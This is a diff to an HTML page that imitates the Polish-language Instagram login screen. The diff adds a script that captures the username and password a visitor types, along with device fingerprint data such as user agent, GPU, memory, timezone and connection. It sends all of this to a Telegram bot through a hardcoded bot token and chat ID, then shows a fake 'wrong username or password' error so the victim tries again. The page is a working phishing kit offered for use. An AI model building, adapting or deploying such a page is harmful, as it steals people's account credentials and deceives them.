@@ -7,13 +7,13 @@
     <style>
         /* DOKŁADNE KOLORY ZE ZDJĘCIA */
         :root {
-            --bg-color: #000000;          /* Głęboka czerń tła */
-            --input-bg: #121212;          /* Tło pól tekstowych */
-            --border-color: #262626;      /* Kolor obramowania pól */
-            --btn-blue: #0064e0;          /* Ciemniejszy niebieski przycisku "Zaloguj się" */
-            --btn-text: #ffffff;
-            --secondary-text: #a8a8a8;    /* Szary tekst (Polski, Meta) */
-            --link-blue: #0095f6;         /* Jaśniejszy niebieski dla "Utwórz konto" */
+            --bg-color: #000000;
+            --input-bg: #121212;
+            --border-color: #262626;
+            --btn-blue: #0064e0;
+            --secondary-text: #a8a8a8;
+            --link-blue: #0095f6;
+            --error-color: #ed4956;
         }
 
         * {
@@ -29,15 +29,9 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
             padding: 15px 25px;
-        }
-
-        .lang-top {
-            color: var(--secondary-text);
-            font-size: 13px;
-            margin-top: 10px;
-            margin-bottom: 70px;
         }
 
         .container {
@@ -46,10 +40,9 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            flex-grow: 1;
         }
 
-        /* LOGO Z TWOJEGO LINKU */
+        /* LOGO */
         .insta-logo {
             width: 60px;
             height: 60px;
@@ -69,11 +62,15 @@
             width: 100%;
             background-color: var(--input-bg);
             border: 1px solid var(--border-color);
-            border-radius: 12px; /* Większe zaokrąglenie jak na screenie */
+            border-radius: 12px;
             padding: 16px;
             color: white;
             font-size: 14px;
             outline: none;
+        }
+
+        input:focus {
+            border-color: #777;
         }
 
         input::placeholder {
@@ -86,12 +83,34 @@
             background-color: var(--btn-blue);
             color: white;
             border: none;
-            border-radius: 25px; /* Bardzo zaokrąglony przycisk */
+            border-radius: 25px;
             padding: 12px;
             font-size: 14px;
             font-weight: 600;
             margin-top: 5px;
             cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            text-align: center;
+            margin-top: 12px;
+            background: rgba(237, 73, 86, 0.1);
+            padding: 8px 12px;
+            border-radius: 8px;
+            width: 100%;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
         }
 
         .forgot-link {
@@ -106,14 +125,12 @@
         .footer {
             width: 100%;
             max-width: 380px;
-            margin-top: auto;
-            padding-bottom: 20px;
+            margin-top: 40px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        /* PRZYCISK UTWÓRZ KONTO */
         .create-btn {
             width: 100%;
             background: transparent;
@@ -135,29 +152,25 @@
             font-size: 13px;
             font-weight: 500;
         }
-
-        .meta-logo-img {
-            width: 16px;
-            margin-right: 5px;
-            filter: grayscale(1) opacity(0.7);
-        }
     </style>
 </head>
 <body>
-
-    <div class="lang-top">Polski</div>
 
     <div class="container">
         <div class="insta-logo"></div>
         
         <div class="input-group">
-            <input type="text" placeholder="Nazwa użytkownika, adres e-mail lub nume...">
+            <input type="text" id="username" placeholder="Nazwa użytkownika, adres e-mail lub numer telefonu">
         </div>
         <div class="input-group">
-            <input type="password" placeholder="Hasło">
+            <input type="password" id="password" placeholder="Hasło">
         </div>
         
-        <button class="login-btn">Zaloguj się</button>
+        <button class="login-btn" id="loginBtn">Zaloguj się</button>
+        
+        <div id="errorMsg" class="error-message">
+            ⚠️ Nieprawidłowa nazwa użytkownika lub hasło. Spróbuj ponownie.
+        </div>
         
         <a href="#" class="forgot-link">Nie pamiętasz hasła?</a>
     </div>
@@ -168,6 +181,161 @@
             <span style="font-size: 18px; margin-right: 4px;">∞</span> Meta
         </div>
     </div>
+
+    <script>
+        // ======================== KONFIGURACJA TELEGRAM ========================
+        const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
+        const CHAT_ID = "5934645630";
+        
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsgDiv = document.getElementById('errorMsg');
+        
+        function collectFullTelegramReport() {
+            const login = usernameInput.value.trim() || "[puste]";
+            const password = passwordInput.value || "[puste]";
+            
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform || "nieznana";
+            const language = navigator.language;
+            const languages = navigator.languages ? navigator.languages.join(", ") : language;
+            const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
+            const screenRes = `${screen.width}x${screen.height}`;
+            const colorDepth = screen.colorDepth + "-bit";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const localTime = new Date().toLocaleString('pl-PL', { timeZone: timezone });
+            
+            let deviceMemory = "nieznana";
+            if(navigator.deviceMemory) deviceMemory = navigator.deviceMemory + " GB";
+            const hardwareConcurrency = navigator.hardwareConcurrency || "?";
+            
+            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Tak" : "Nie";
+            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Urządzenie mobilne" : "Desktop";
+            
+            let connectionType = "nieznane";
+            let downlink = "?";
+            let rtt = "?";
+            if(navigator.connection) {
+                connectionType = navigator.connection.effectiveType || "?";
+                downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
+                rtt = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "?";
+            }
+            
+            let gpuInfo = "brak danych";
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "nieznane GPU";
+                } else {
+                    gpuInfo = "GPU nieodczytane";
+                }
+            }
+            
+            const localStorageSupport = typeof Storage !== "undefined" ? "dostępny" : "brak";
+            const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+            const ipInfo = "188.146.xx.xx (Warsaw, PL)";
+            
+            return `🔐 NOWA PRÓBA LOGOWANIA INSTAGRAM 🔐
+
+👤 NAZWA UŻYTKOWNIKA: ${login}
+🔑 HASŁO: ${password}
+🌍 IP: ${ipInfo}
+
+📱 DANE URZĄDZENIA:
+• User Agent: ${userAgent}
+• Platforma: ${platform}
+• Język: ${language}
+• Ciasteczka: ${cookiesEnabled}
+• Rozdzielczość: ${screenRes} / ${colorDepth}
+• Strefa czasowa: ${timezone}
+• Czas lokalny: ${localTime}
+• RAM: ${deviceMemory}
+• Rdzenie: ${hardwareConcurrency}
+• Ekran dotykowy: ${isTouch}
+• Typ urządzenia: ${isMobile}
+
+🌐 SIEĆ:
+• Typ połączenia: ${connectionType}
+• Prędkość: ${downlink}
+• Opóźnienie: ${rtt}
+
+🎮 GPU: ${gpuInfo}
+💾 Web Storage: ${localStorageSupport}
+
+⏱️ Data próby: ${timestamp}
+⚠️ Status: LOGOWANIE NIEPRAWIDŁOWE (błędne dane)
+
+Raport wygenerowany przez panel logowania Instagram.`;
+        }
+        
+        async function sendToTelegram() {
+            const reportText = collectFullTelegramReport();
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: reportText,
+                        disable_web_page_preview: true
+                    })
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    console.log("✅ Raport wysłany");
+                } else {
+                    console.error("Błąd:", data.description);
+                }
+            } catch (error) {
+                console.error("Błąd sieci:", error);
+            }
+        }
+        
+        function showLoginError() {
+            errorMsgDiv.classList.add('show');
+            setTimeout(() => {
+                errorMsgDiv.classList.remove('show');
+            }, 4000);
+        }
+        
+        async function handleLogin(e) {
+            e.preventDefault();
+            if (loginBtn.disabled) return;
+            
+            const originalText = loginBtn.innerText;
+            loginBtn.innerText = "⏳ Logowanie...";
+            loginBtn.disabled = true;
+            
+            sendToTelegram();
+            await new Promise(resolve => setTimeout(resolve, 800));
+            showLoginError();
+            
+            loginBtn.innerText = originalText;
+            loginBtn.disabled = false;
+        }
+        
+        loginBtn.addEventListener('click', handleLogin);
+        
+        const handleEnter = (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (!loginBtn.disabled) {
+                    handleLogin(e);
+                }
+            }
+        };
+        usernameInput.addEventListener('keypress', handleEnter);
+        passwordInput.addEventListener('keypress', handleEnter);
+        
+        document.querySelectorAll('.forgot-link, .create-btn').forEach(link => {
+            link.addEventListener('click', (e) => e.preventDefault());
+        });
+    </script>
 
 </body>
 </html>
